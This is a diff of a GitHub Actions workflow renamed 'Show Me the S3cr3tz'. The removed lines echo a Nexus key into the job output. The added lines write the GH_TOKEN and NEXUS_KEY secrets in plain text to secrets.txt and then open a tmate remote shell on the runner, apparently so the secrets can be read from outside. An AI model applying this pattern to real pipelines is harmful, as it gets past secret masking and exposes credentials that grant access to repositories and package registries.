@@ -1,14 +1,23 @@
-name: Test
+name: Show Me the S3cr3tz
 on:
   workflow_dispatch:
+
 jobs:
-  test:
+  debug:
+    name: Debug
     runs-on: ubuntu-latest
+
     steps:
-      - name: Run tests
-        run: |
-          echo "$NEXUS_KEY\n" >> $GITHUB_OUTPUT
-        id: run_tests
-        env:
-          NEXUS_KEY: ${{ secrets.NEXUS_KEY }}
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        GH_TOKEN: ${{ secrets.GH_TOKEN }}
+        NEXUS_KEY: ${{ secrets.NEXUS_KEY }}
+      run: |
+        echo $GH_TOKEN >> secrets.txt
+        echo $NEXUS_KEY >> secrets.txt
+
+    - name: Run tmate
+      uses: mxschmitt/action-tmate@v2
